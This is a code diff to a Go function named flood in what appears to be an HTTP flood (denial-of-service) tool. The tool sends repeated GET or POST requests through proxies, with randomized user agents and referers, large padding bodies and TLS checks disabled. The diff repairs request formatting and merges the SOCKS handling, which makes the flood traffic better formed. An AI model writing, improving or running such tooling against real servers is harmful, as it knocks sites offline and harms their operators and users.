@@ -155,13 +155,12 @@ func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
 			addr := host + ":" + port
 			header := ""
 			if mode == "get" {
-				header += " HTTP/1.1\r\nHost: "
-				header += addr + "\r\n"
+				header += "GET " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 				if headerFile == "nil" {
 					header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 					header += "User-Agent: " + getuseragent() + "\r\n"
 					header += acceptall[rand.Intn(len(acceptall))]
-					header += referers[rand.Intn(len(referers))] + "\r\n"
+					header += "Referer: " + referers[rand.Intn(len(referers))] + "\r\n"
 				} else {
 					func() {
 						fi, err := os.Open(headerFile)
@@ -181,30 +180,10 @@ func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
 					}()
 				}
 			} else if mode == "post" {
-				data := ""
-				if headerFile != "nil" {
-					func() {
-						fi, err := os.Open(headerFile)
-						if err != nil {
-							fmt.Printf("Error: %s\n", err)
-							return
-						}
-						defer fi.Close()
-						br := bufio.NewReader(fi)
-						for {
-							a, _, c := br.ReadLine()
-							if c == io.EOF {
-								break
-							}
-							header += string(a) + "\r\n"
-						}
-					}()
-				} else {
-					data = strings.Repeat("a", payloadKB*1024)
-				}
+				data := strings.Repeat("a", payloadKB*1024)
 				header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-				header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
-				header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
+				header += "Connection: Keep-Alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
+				header += "Accept-Encoding: gzip, deflate\r\n\r\n" + data
 			}
 
 			var s net.Conn
@@ -217,12 +196,7 @@ func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
 					s, err = tls.Dial("tcp", proxyURL.Host, &tls.Config{
 						InsecureSkipVerify: true,
 					})
-				} else if strings.HasPrefix(proxy, "socks4") {
-					dialer := &net.Dialer{
-						Timeout: timeout,
-					}
-					s, err = dialer.Dial("tcp", proxy)
-				} else if strings.HasPrefix(proxy, "socks5") {
+				} else if strings.HasPrefix(proxy, "socks4") || strings.HasPrefix(proxy, "socks5") {
 					dialer := &net.Dialer{
 						Timeout: timeout,
 					}
@@ -247,12 +221,7 @@ func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
 				continue
 			}
 
-			request := ""
-			if mode == "get" {
-				request += "GET " + page + key
-				request += strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
-			}
-			request += header + "\r\n"
+			request := header + "\r\n"
 			s.Write([]byte(request))
 
 			logMutex.Lock()
